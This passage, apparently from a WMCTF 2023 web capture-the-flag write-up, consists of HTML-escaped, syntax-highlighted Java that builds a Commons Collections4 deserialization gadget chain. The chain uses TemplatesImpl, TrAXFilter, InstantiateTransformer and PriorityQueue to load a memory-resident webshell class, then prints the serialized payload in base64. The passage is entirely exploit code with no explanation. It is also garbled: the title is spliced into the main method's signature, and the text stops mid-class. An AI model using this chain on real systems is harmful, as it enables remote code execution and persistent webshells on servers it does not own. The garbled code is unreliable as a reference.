&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;org&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;commons&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;collections4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;comparators&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;TransformingComparator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;org&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;commons&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;collections4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;functors&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ChainedTransformer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;org&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;commons&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;collections4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;functors&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ConstantTransformer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;org&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apache&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;commons&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;collections4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;functors&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;InstantiateTransformer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;javax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;xml&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;transform&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Templates&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;io&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;lang&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;reflect&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Field&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;PriorityQueue&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ExpFin &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;WMCTF &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2023&lt;&#x2F;span&gt;&lt;span&gt; web writeup &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;[] &lt;&#x2F;span&gt;&lt;span&gt;args) throws &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ClassPool&lt;&#x2F;span&gt;&lt;span&gt; pool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ClassPool&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getDefault&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F;内存马
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;byte[]&lt;&#x2F;span&gt;&lt;span&gt; bytes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Repository&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;lookupClass&lt;&#x2F;span&gt;&lt;span&gt;(dawd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getBytes&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Templates&lt;&#x2F;span&gt;&lt;span&gt; templatesImpl &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;TemplatesImpl&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setFieldValue&lt;&#x2F;span&gt;&lt;span&gt;(templatesImpl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;_bytecodes&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new byte&lt;&#x2F;span&gt;&lt;span&gt;[][]{bytes})&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setFieldValue&lt;&#x2F;span&gt;&lt;span&gt;(templatesImpl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;_name&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;aaaa&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setFieldValue&lt;&#x2F;span&gt;&lt;span&gt;(templatesImpl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;_tfactory&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;null&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Transformer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;[]&lt;&#x2F;span&gt;&lt;span&gt; transformers &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Transformer&lt;&#x2F;span&gt;&lt;span&gt;[] {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ConstantTransformer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;TrAXFilter&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;InstantiateTransformer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Class&lt;&#x2F;span&gt;&lt;span&gt;[]{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Templates&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Object&lt;&#x2F;span&gt;&lt;span&gt;[]{templatesImpl})
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ChainedTransformer&lt;&#x2F;span&gt;&lt;span&gt; chain &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ChainedTransformer&lt;&#x2F;span&gt;&lt;span&gt;(transformers)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;InstantiateTransformer&lt;&#x2F;span&gt;&lt;span&gt; instantiateTransformer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;InstantiateTransformer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Class&lt;&#x2F;span&gt;&lt;span&gt;[]{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Templates&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Object&lt;&#x2F;span&gt;&lt;span&gt;[]{templatesImpl})&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;TransformingComparator&lt;&#x2F;span&gt;&lt;span&gt; transformingComparator &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;TransformingComparator&lt;&#x2F;span&gt;&lt;span&gt;(instantiateTransformer)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;PriorityQueue&lt;&#x2F;span&gt;&lt;span&gt; priorityQueue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;PriorityQueue&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;transformingComparator)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Field&lt;&#x2F;span&gt;&lt;span&gt; sizeField &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;PriorityQueue&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getDeclaredField&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;size&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        sizeField&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAccessible&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        sizeField&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(priorityQueue&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Field&lt;&#x2F;span&gt;&lt;span&gt; queueField &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;PriorityQueue&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getDeclaredField&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;queue&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        queueField&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAccessible&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        queueField&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(priorityQueue&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Object&lt;&#x2F;span&gt;&lt;span&gt;[]{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;TrAXFilter&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;bar&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;})&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ByteArrayOutputStream&lt;&#x2F;span&gt;&lt;span&gt; barr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ByteArrayOutputStream&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ObjectOutputStream&lt;&#x2F;span&gt;&lt;span&gt; objectOutputStream &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ObjectOutputStream&lt;&#x2F;span&gt;&lt;span&gt;(barr)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        objectOutputStream&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;writeObject&lt;&#x2F;span&gt;&lt;span&gt;(priorityQueue)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        objectOutputStream&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; res &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getEncoder&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encodeToString&lt;&#x2F;span&gt;&lt;span&gt;(barr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;toByteArray&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(res)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
